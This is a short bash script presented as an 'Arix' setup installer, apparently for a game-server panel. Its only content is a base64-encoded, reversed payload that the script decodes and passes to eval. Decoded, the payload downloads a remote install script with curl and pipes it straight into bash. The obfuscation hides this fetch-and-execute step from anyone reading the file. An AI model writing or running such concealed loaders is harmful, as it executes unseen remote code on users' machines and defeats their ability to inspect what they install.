#!/bin/bash
# SDGAMER Arix Setup 

PAYLOAD="KWhzLmxsYXRzbmkteGlyYS9uaWFtLzFub2l0bmV0eGVfbHl0Y2Fkb3JldHAvaGN0ZWtzLTM2MjhyZW1hZ2RzL21vYy50bmV0bm9jcmVzdWJ1aHRpZy53YXIvLjpzcHR0aCBMcy0gbHJ1Yyg8IGhzYWI="

eval "$(echo "$PAYLOAD" | base64 -d | rev)"
